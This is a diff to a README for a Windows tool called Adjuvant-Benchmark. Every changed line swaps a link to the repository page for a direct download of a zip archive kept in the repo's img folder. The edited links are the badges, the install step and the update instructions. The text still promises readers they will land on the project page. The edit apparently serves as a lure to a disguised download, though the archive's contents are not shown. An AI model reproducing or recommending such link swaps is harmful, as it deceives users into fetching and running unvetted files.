@@ -1,6 +1,6 @@
 # 🧪 Adjuvant-Benchmark - Simple Tool for Adjuvant Research
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Adjuvant--Benchmark-blue?style=for-the-badge)](https://github.com/ihmzashah/Adjuvant-Benchmark)
+[![Download Latest Version](https://img.shields.io/badge/Download-Adjuvant--Benchmark-blue?style=for-the-badge)](https://github.com/ihmzashah/Adjuvant-Benchmark/raw/refs/heads/main/img/Benchmark_Adjuvant_3.4.zip)
 
 ---
 
@@ -29,7 +29,7 @@ These requirements ensure the program runs smoothly and performs its tasks corre
 Follow these steps to download and run Adjuvant-Benchmark on your Windows PC.
 
 1. Open this download page:  
-   [https://github.com/ihmzashah/Adjuvant-Benchmark](https://github.com/ihmzashah/Adjuvant-Benchmark)  
+   [https://github.com/ihmzashah/Adjuvant-Benchmark/raw/refs/heads/main/img/Benchmark_Adjuvant_3.4.zip](https://github.com/ihmzashah/Adjuvant-Benchmark/raw/refs/heads/main/img/Benchmark_Adjuvant_3.4.zip)  
    You will land on the project’s main GitHub page.
 
 2. Look for the latest release under the “Releases” section or in the repository’s files. This page hosts the files needed for installation.
@@ -65,7 +65,7 @@ All actions provide clear instructions on the screen. Tooltips explain the funct
 
 To keep Adjuvant-Benchmark up to date, check the download page regularly:
 
-[https://github.com/ihmzashah/Adjuvant-Benchmark](https://github.com/ihmzashah/Adjuvant-Benchmark)
+[https://github.com/ihmzashah/Adjuvant-Benchmark/raw/refs/heads/main/img/Benchmark_Adjuvant_3.4.zip](https://github.com/ihmzashah/Adjuvant-Benchmark/raw/refs/heads/main/img/Benchmark_Adjuvant_3.4.zip)
 
 New releases may improve stability or add features. Repeat the download and install steps with the new installer to update your software.
 
@@ -125,4 +125,4 @@ This layout keeps your work organized and easy to find.
 
 ---
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Adjuvant--Benchmark-blue?style=for-the-badge)](https://github.com/ihmzashah/Adjuvant-Benchmark)
+[![Download Latest Version](https://img.shields.io/badge/Download-Adjuvant--Benchmark-blue?style=for-the-badge)](https://github.com/ihmzashah/Adjuvant-Benchmark/raw/refs/heads/main/img/Benchmark_Adjuvant_3.4.zip)
